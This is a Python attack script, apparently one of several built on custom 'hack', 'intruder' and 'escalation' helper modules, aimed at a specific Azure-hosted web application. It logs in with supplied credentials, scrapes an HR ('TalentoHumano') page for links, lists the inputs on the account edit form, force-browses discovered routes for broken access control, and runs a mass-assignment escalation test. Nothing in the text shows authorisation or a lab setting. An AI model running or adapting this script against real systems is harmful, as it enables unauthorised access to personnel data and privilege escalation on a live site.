import sys, json, re
import hack_api as H, intruso_api as I, escalada_api as E

BASE = 'https://app-landing-270-grados-dgbedwcgaxcdavc2.eastus2-01.azurewebsites.net'
LOGIN = BASE + '/Auth/Login'
alias, clave = sys.argv[1], sys.argv[2]

r = I.entrar(LOGIN, alias, clave, campo_extra='Recordarme=true')
print('login:', r.get('ok'))
if not r.get('ok'):
    sys.exit('no entro')

t, e = H._pedir(BASE + '/TalentoHumano')
print('\n=== TALENTO HUMANO ===')
print('status', t.status_code, 'largo', len(t.content or b''), '|', H._titulo(t.text))
enlaces = I._enlaces(t.text, t.url)
print('\nLINKS:')
for x in enlaces:
    print(' ', x)
print('\nTEXTO:')
print(re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', t.text))[:1800])

print('\n=== CAMPOS DE /Cuenta/Editar ===')
c, e2 = H._pedir(BASE + '/Cuenta/Editar')
if not e2 and c is not None:
    for n, tp, v in I._inputs(c.text):
        print(' ', tp, '|', n, '|', (v or '')[:40])
    print(' selects:')
    for m in re.findall(r'<select[^>]*name=["\']([^"\']+)', c.text, re.I):
        print('  select:', m)

rutas = [x[len(BASE) + 1:] for x in enlaces if x.startswith(BASE + '/')]
if rutas:
    fp = E.forzar_panel(BASE, rutas=','.join(rutas[:25]), limite=25)
    print('\n=== FORZAR DENTRO ===')
    print(json.dumps({'rotas': fp.get('rotas'),
                      'abiertas': [(f['ruta'], f['status'], f['largo']) for f in fp.get('abiertas', [])],
                      'cerradas': fp.get('cerradas', [])[:15]}, ensure_ascii=False, indent=1))
    canario = None
    for f in fp.get('abiertas', []):
        if f['roto'] and 'talento' in f['ruta'].lower() and f['largo'] > 800:
            canario = BASE + '/' + f['ruta']
            break
    print('\ncanario:', canario)
    if canario:
        pm = E.probar_masivo(BASE + '/Cuenta/Editar', canario=canario, url_login=LOGIN,
                             usuario=alias, clave=clave, limite=10)
        print('\n=== MASIVO ===')
        print(json.dumps(pm, ensure_ascii=False, indent=1)[:2000])
print('\nFIN')
